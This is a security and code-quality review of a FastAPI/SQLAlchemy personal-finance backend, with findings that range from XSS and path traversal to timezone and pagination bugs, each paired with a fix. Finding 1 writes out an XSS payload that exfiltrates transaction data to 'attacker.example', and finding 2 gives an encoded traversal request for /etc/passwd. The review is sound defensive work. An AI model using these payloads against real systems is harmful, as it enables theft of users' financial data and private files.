# Backend: API, Data Layer & Services Review

Scope: `app.py`, `config.py`, `logging_setup.py`, `db/{models,session,seed}.py`, `api/deps.py`, `api/routes/*.py`, `domain/enums.py`, `services/{dashboard,transactions,categories,date_repair}.py`.

## Strengths

- No SQL injection surface anywhere: every query goes through SQLAlchemy Core/ORM with bound parameters, including the `ilike` search in `services/transactions.py:84-90`. The only raw `text()` SQL (`db/session.py:73-83`) takes no user input.
- `logging_setup.py:57` deliberately drops `uvicorn.access` to `WARNING`, preventing the OAuth `code`/`state` query-string values on `GET /oauth/callback` from being written to the access log — a detail that's easy to miss and was clearly considered.
- `api/routes/gmail.py:83-90` writes credentials then immediately `chmod(0o600)`s the file and keeps a `.bak` copy via `shutil.copy2` (which preserves permissions).
- `salary_pay_period`'s core day-cutoff arithmetic (`services/dashboard.py:59-68`) and `_shift_month` (`:29-31`) are correct by hand-check: Aug 31 (day > 2) → shifts to September; Sep 1 (day ≤ 2) → stays September; year rollover verified for Dec 2025 ↔ Jan 2026.
- `classify_transaction` (`services/transactions.py:155-160`) correctly sets `user_verified=True`, `needs_review=False`, `classification_source="user"` per the documented domain rule.
- SQLite is configured sensibly: `PRAGMA foreign_keys=ON`, `journal_mode=WAL`, `busy_timeout=5000` (`db/session.py:24-31`).
- Bulk endpoints cap batch size at 200 (`services/transactions.py:177-183`), and category/subcategory deletion refuses when still referenced by transactions or when system-owned (`services/categories.py:94-111,151-166`).

## Findings

**1. [Critical] Reflected XSS in the OAuth callback page — `api/routes/gmail.py:132-150`**

`oauth_callback`'s `page(title, body, ok)` helper builds the HTML response with a raw f-string (`<h1>{title}</h1> ... <p>{body}</p>`, lines 134-147) with no escaping. Line 149-150 passes the `error` query parameter straight through as `body`:

```python
if error:
    return page("Gmail connection failed", error, ok=False)
```

`error` is fully attacker-controlled and the response is an `HTMLResponse`, so it renders verbatim.

*Failure scenario:* a page open in the user's browser navigates to `http://127.0.0.1:8477/oauth/callback?error=<script>fetch('/api/transactions?limit=200').then(r=>r.json()).then(d=>fetch('https://attacker.example/collect',{method:'POST',body:JSON.stringify(d)}))</script>`. The injected script executes same-origin to `127.0.0.1:8477`, bypassing CORS entirely, and can read/exfiltrate transaction data or call `PATCH /api/transactions/{id}/classify`, `/api/gmail/sync`, `/api/gmail/disconnect` — full read/write access to the app's API from a single unauthenticated GET.

*Fix:* HTML-escape `title`/`body` (e.g. `html.escape()`) before interpolation, or use an auto-escaping template engine instead of manual f-strings. Never reflect raw query parameters into HTML.

**2. [High] Path traversal in the hand-rolled SPA fallback route — `app.py:73-80` (confirmed by reproduction)**

```python
@app.get("/{full_path:path}")
def spa_fallback(full_path: str) -> FileResponse:
    if full_path.startswith("api/"):
        raise HTTPException(status_code=404, detail="Not found")
    candidate = dist / full_path
    if candidate.is_file():
        return FileResponse(candidate)
    return FileResponse(dist / "index.html")
```

`dist / full_path` is joined with no normalization/containment check, unlike Starlette's `StaticFiles` (used correctly for `/assets` at `app.py:65-67`), which does guard against this. Reproduced against the exact logic: a literal `../secret.txt` gets normalized away by the HTTP client/library, but a percent-encoded `%2e%2e/secret.txt` reaches the handler as `..` after URL-decoding, and `candidate.is_file()` resolves outside `dist`, returning the file's real contents with `200 OK`.

*Failure scenario:* `GET http://127.0.0.1:8477/%2e%2e/%2e%2e/%2e%2e/etc/passwd` (or any file readable by the server process) served back as a `FileResponse`, reachable via any direct browser navigation, no auth required.

*Fix:* resolve `candidate` and verify it is a descendant of `dist` (e.g. `candidate.resolve().is_relative_to(dist.resolve())`) before serving, or route the SPA fallback through `StaticFiles`' own safe lookup instead of manual path joins.

**3. [High] "Current month" and pay-period math is anchored to true UTC, not the user's local calendar day — `services/dashboard.py:16-20,98-100,156-163`**

`get_overview`/`income_trend` default `now = datetime.now(timezone.utc)`, and `_month_bounds` builds boundaries with `tzinfo=timezone.utc`. There is no timezone concept anywhere in `config.py`/`dashboard.py` tying "current month" to the user's locale, even though the domain rule (salary pay-period, monthly totals) is inherently about the user's local calendar day.

*Failure scenario:* it's 2026-09-01, 02:00 IST (already September 1st locally) — that instant is 2026-08-31 20:30 UTC. `get_overview()` computes `now.month=8`, so August is used as "current month": the Overview still reports August's spend/income and `"period": {"year":2026,"month":8}` even though the user is already in September. This recurs for ~5.5 hours (00:00–05:29 IST) every single day, and near month boundaries it manifests as an entire day's transactions being attributed to the wrong month.

*Note:* whether stored `transaction_date` values carry the same skew depends on parser behavior (out of scope here); this specific bug — the "now" used to pick month boundaries — is confirmed from `dashboard.py` alone, independent of parser assumptions.

*Fix:* derive "now" from a configured local timezone (e.g., add an explicit IST/local tz setting and use `datetime.now(local_tz)`) rather than hardcoding `timezone.utc`.

**4. [High] Manually classifying non-salary "Income" subcategories still gets shifted by the salary-only pay-period rule — `services/transactions.py:115-123` + `services/dashboard.py:59-95`**

`_apply_category_side_effects` only special-cases the `"refund"` subcategory under Income; every other Income subcategory (`Salary`, `Interest`, `Other Income` — see `db/seed.py:24`) falls into the `else` branch and gets `tx.transaction_type = "income"` unconditionally. `income_for_pay_period` (`dashboard.py:87-95`) then applies `salary_pay_period()` — a rule explicitly documented as being about salary's "credited near month-end pays next month" quirk — to every row with `transaction_type == "income"`, with no distinction for non-salary income.

*Failure scenario:* user manually classifies a bank-interest credit dated 2026-08-20 (day 20 > 2) as `Income > Interest`. `_apply_category_side_effects` sets `transaction_type="income"`; `salary_pay_period` maps it to `(2026, 9)`. The interest, though received in August, is entirely absent from August's income total and instead inflates September's — despite having nothing to do with salary's payroll-timing quirk.

*Fix:* only apply `salary_pay_period()` shifting to rows actually identified as salary (e.g. a subcategory-slug check, or a distinct `TransactionType.INTEREST`), and have `_apply_category_side_effects` preserve that distinction instead of collapsing all non-refund Income subcategories to the same bare `"income"` type.

**5. [Medium] CSRF-exploitable mutating endpoints; `/credentials/from-path` also does an unrestricted local file read — `api/routes/gmail.py:99-111,171-174,177-209,114-122`; `api/routes/transactions.py:83-87`**

Endpoints that take only query parameters (no JSON body) — `POST /api/gmail/disconnect`, `/sync`, `/credentials/from-path`, `/auth/start`, `POST /api/transactions/sample` — are "simple requests" from a CORS standpoint and can be triggered by a plain cross-origin HTML `<form>` POST with no preflight; CORS's `allow_origins` allowlist (`app.py:44-54`) restricts response-*reading*, not sending a form POST. There is no CSRF token or auth of any kind. `install_credentials_from_path` additionally takes an arbitrary caller-supplied `path` and reads it off disk (`src = Path(path).expanduser(); src.read_text(...)`, lines 104-108) with no restriction on which files can be targeted.

*Failure scenario:* while the server is running, a webpage open in another browser tab auto-submits a hidden form to `POST http://127.0.0.1:8477/api/gmail/disconnect`, silently disconnecting Gmail, or to `/api/gmail/credentials/from-path?path=...` to overwrite the stored OAuth client credentials with the contents of an attacker-plantable file — no user interaction beyond having the tab open.

*Fix:* require a same-origin-only header or CSRF token on all state-mutating routes, reject simple-request POSTs lacking it, and drop the `from-path` variant in favor of a desktop file-picker flow that never accepts an arbitrary path over HTTP.

**6. [Medium] No database migration mechanism — `db/session.py:64-83`, `db/seed.py:34-37`**

`init_db` only calls `Base.metadata.create_all(bind=engine)`, which creates missing *tables* but never alters existing ones, then stamps a `schema_meta.schema_version='1'` row that nothing else in the codebase ever reads. There is no Alembic directory or any ad-hoc `ALTER TABLE` anywhere in the repo. `seed_defaults` also only seeds categories when the table is completely empty (`seed.py:35-37`), so a newly added default category never reaches an existing install.

*Failure scenario:* a future release adds a new non-nullable column (or default category) to `Transaction`/`Category`. Existing users' on-disk DBs already have those tables, so `create_all()` is a silent no-op; the next query referencing the new column raises `OperationalError: no such column`, and the new default category never appears for existing installs.

*Fix:* adopt Alembic (or hand-write versioned `ALTER TABLE` steps gated by `schema_meta.schema_version`) and actually run/check it against that version column.

**7. [Medium] `list_transactions` computes pagination "total" by loading the entire filtered result set — `services/transactions.py:75-98`, specifically line 92**

```python
total = len(session.execute(stmt).unique().scalars().all())
rows = session.execute(stmt.limit(limit).offset(offset)).unique().scalars().all()
```

Every call to `GET /api/transactions` (regardless of the requested `limit`) fully hydrates *every* matching `Transaction` row (with `joinedload` of category/subcategory) just to discard them and return `len()`, then re-runs the query a second time for the actual page.

*Failure scenario:* after a year of Gmail ingestion (thousands of rows), a request for `?limit=50` still does two full table scans/joins and materializes the entire matching set into ORM objects — cost scales with total transaction history, not page size.

*Fix:* compute `total` via `select(func.count()).select_from(stmt.order_by(None).subquery())` (or a count statement built from the same filters, without `order_by`/`joinedload`), and only fetch the page for `rows`.

**8. [Medium] Month-boundary end lacks sub-second precision, silently dropping last-instant-of-month transactions from every monthly aggregate — `services/dashboard.py:16-20`**

```python
end = datetime(year, month, last_day, 23, 59, 59, tzinfo=timezone.utc)
```

Zero microseconds. `_spending_query`, `get_overview`'s "largest transaction"/`transaction_count`, and `spending_by_category` all filter with `Transaction.transaction_date <= end`.

*Failure scenario:* a transaction timestamped `2026-08-31T23:59:59.500000+00:00` fails `<= 2026-08-31T23:59:59.000000` for August's window, and also fails `>= 2026-09-01T00:00:00.000000` for September's window — excluded from *both* months' spending totals, category breakdown, and transaction count, with no error or indication.

*Fix:* use an exclusive upper bound at the start of the next month (`Transaction.transaction_date < next_month_start`) in all four query builders.

**9. [Medium] Domain enums exist but aren't enforced anywhere in the schema or model layer — `domain/enums.py` vs `db/models.py:134-135,154`**

`Transaction.direction`, `transaction_type`, `classification_source` (also `Email.parse_status`) are plain `String` columns with no `CheckConstraint`, no SQLAlchemy `Enum` type, and no validator tying them to `domain/enums.py`. `services/dashboard.py` never imports `domain.enums` at all and compares against hardcoded literals (`"debit"`, `"income"`) throughout.

*Failure scenario:* any code path that writes a mistyped or out-of-vocabulary value (e.g. `"Debit"` instead of `"debit"`) is accepted silently by the DB and ORM; it then simply fails to match every hardcoded string comparison in `dashboard.py`/`services/*.py`, silently excluding that row from spend/income totals rather than raising a visible error.

*Fix:* back these columns with a `CheckConstraint` (or SQLAlchemy `Enum(Direction)`, etc.) tied to `domain/enums.py`, and use the enum members consistently instead of literal strings in query filters and assignments.

**10. [Low-Medium] Log redaction filter fails open on formatting errors — `logging_setup.py:15-25`**

```python
def filter(self, record: logging.LogRecord) -> bool:
    try:
        message = record.getMessage()
    except Exception:
        return True
    ...
```

If `record.getMessage()` raises (e.g. a `%`-format placeholder/arg mismatch), the filter returns `True` and lets the **original, unredacted** record through — the opposite of "never log secrets" stated in the module's own docstring.

*Failure scenario:* any future `logger.info("... %s token ...")` call with a mismatched arg count throws inside `getMessage()`, and the raw record (potentially containing the sensitive value the redactor was supposed to catch) is emitted verbatim to console and the rotating log file.

*Fix:* on exception, suppress the record (return `False`) or replace `record.msg` with a generic redacted placeholder rather than passing the original through.

**11. [Low] N+1-style query patterns**

- `services/categories.py:19-49` — `list_categories` issues one `SELECT COUNT(...)` per category inside the loop (line 26-28) instead of a single grouped query; the correct pattern already exists nearby in `dashboard.py:187-210` (`group_by(Transaction.category_id)`) and could be reused.
- `services/dashboard.py:156-176` — `income_trend` calls `income_for_pay_period` once per month, up to 24 round trips for `months=24`, instead of one ranged query bucketed in Python.
- `services/transactions.py:186-216,261-263` — `classify_transactions_bulk`/`exclude_transactions_bulk` call the per-row function once per id (bounded at 200), each doing its own `flush()` + `refresh()`, instead of a single batched update.

Low-impact at single-user SQLite volumes, but worth consolidating given the pattern repeats three times.

**12. [Low] Dead code / unused config**

- `db/session.py:86-95` (`get_db`) duplicates `api/deps.py:15-24` (`db_session`) almost verbatim and is never called anywhere (confirmed via `grep -rn "get_db("`).
- `config.py:84` (`DashboardConfig.month_start_day`) and its `config/default.yaml` entry are read nowhere — `dashboard.py` never receives a `Settings` object at all, so this setting has zero effect regardless of its value.
- `services/dashboard.py:239` (`get_system_status`) hardcodes `"connected": False,  # Phase 2`, which `api/routes/system.py:33` always overwrites immediately after — stale scaffolding.
- `db/models.py:292-295` (`_touch_transaction_updated_at` event listener) duplicates the column-level `onupdate=utcnow` already declared for `Transaction.updated_at` (lines 168-171); several call sites additionally set `tx.updated_at = utcnow()` by hand — the same field gets "touched" up to three redundant ways.
- `_as_float` is duplicated near-identically in `services/dashboard.py:34-39` and `services/transactions.py:18-23`.

**13. [Low] `Transaction.amount` type hint doesn't match its runtime type; no non-negative constraint — `db/models.py:132`**

`amount: Mapped[float] = mapped_column(Numeric(18, 4), ...)` — SQLAlchemy's `Numeric` returns `Decimal` at runtime (default `asdecimal=True`), not `float`, which is why both `dashboard.py` and `transactions.py` need defensive `isinstance(value, Decimal)` branches in their `_as_float` helpers. There is also no `CheckConstraint("amount >= 0")`, so a malformed insert with a negative amount would silently subtract from `_spending_query`'s `SUM(amount)` rather than being rejected.

**14. [Low] Inconsistent use of the `TransactionType` enum vs. raw string literals — `services/transactions.py:14,109-129,227`**

`TransactionType` is used correctly for `TransactionType.NOT_A_TRANSACTION` (line 227), but `_apply_category_side_effects` (lines 109-129) sets/compares `tx.transaction_type` against raw literals (`"income"`, `"refund"`, `"transfer"`, `"purchase"`, `"other"`, `"unknown"`) in the same file. A rename of an enum value wouldn't be caught by type-checking in the literal-string branches.
